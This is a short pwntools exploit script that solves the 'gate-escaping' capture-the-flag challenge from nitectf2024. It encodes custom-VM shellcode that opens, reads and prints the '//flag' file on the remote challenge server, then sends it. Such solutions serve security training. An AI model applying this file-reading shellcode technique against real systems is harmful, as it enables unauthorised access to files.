#!/usr/bin/env python3


from pwn import *

#r = process("./chall")
r = remote("gate-escaping.chals.nitectf2024.live",1337,ssl=True)
#r = remote("127.0.0.1",1337)
def crafter(shellcode):
    instructions = {b'svc':b'\xff',b'sub':b'\x20',b'mov':b'\x22',b'mov_mem':b'\x24',b'invor':b'\x26',b'imm':b'\x28',b'mov_from_mem':b'\x2a',b'conditional_jump':b'\x2b',b'invadd':b'\x2c',b'add':b'\x30',b'lsl':b'\x5a',b'mul':b'\x5e',b'lsr':b'\x67',b'complex_math':b'\x72',b'more_complex_math':b'\x8f',b'nop':b'\x91',b'jump':b'\x98',b'and':b'\xbf',b'or':b'\xb9',b'atoi_move':b'\xdd'}
    custom_vm = b""
    registers = {b'al':b'\xe1',b'bl':b'\xe2',b'cl':b'\xe3',b'dl':b'\xe4'}
    syscalls = {b'write':b'\x2e',b'read':b'\x2d',b'open':b'\x23',b'exit':b'\x25'}
    for i in shellcode.split(b'\n'):
        shellcode_bytes = i.split(b' ')
        opcode = shellcode_bytes[0]
        if(opcode == b"imm" or opcode == b"mov_mem"):
            custom_vm += instructions.get(opcode)
            custom_vm += registers.get(shellcode_bytes[1])
            custom_vm += shellcode_bytes[2]
        elif(opcode == b"add"):
            custom_vm += instructions.get(opcode)
            custom_vm += registers.get(shellcode_bytes[1])
            custom_vm += registers.get(shellcode_bytes[2])
        elif(opcode == b"svc"):
            custom_vm += instructions.get(opcode)
            custom_vm += syscalls.get(shellcode_bytes[1])
    return custom_vm

r.sendlineafter("choose your path (0-3):",b"1")
shellcode = crafter(b"""imm al \x2f
mov_mem al \x9a
imm al \x2f
mov_mem al \x9b
imm al \x66
mov_mem al \x9c
imm al \x6c
mov_mem al \x9d
imm al \x61
mov_mem al \x9e
imm al \x67
mov_mem al \x9f
imm al \x00
mov_mem al \xa0
imm al \x9a
svc open
imm al \x05
imm bl \x5a
imm cl \x40
svc read
imm al \x01
imm bl \x5a
imm cl \x40
svc write""")
shellcode+=b"\x91" * 27
r.sendafter(b"a gate asks for your wishes:",shellcode)
r.sendafter(b"choose your path (0-3):",b"56")
r.interactive()
